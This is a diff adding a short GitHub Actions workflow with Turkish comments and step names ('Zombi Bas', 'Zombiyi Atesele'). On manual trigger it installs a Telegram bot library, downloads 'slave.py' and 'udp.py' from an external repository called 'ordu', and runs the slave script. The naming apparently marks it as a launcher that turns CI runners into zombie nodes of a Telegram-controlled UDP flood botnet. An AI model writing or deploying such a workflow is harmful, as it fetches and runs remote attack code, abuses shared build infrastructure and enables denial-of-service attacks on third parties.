@@ -1,0 +1,12 @@
+name: Zombi Bas
+on: [workflow_dispatch] # Sen düğmeye basınca çalışır
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Zombiyi Atesele
+        run: |
+          pip install pyTelegramBotAPI
+          wget -q -O slave.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/slave.py
+          wget -q -O udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py
+          python3 slave.py
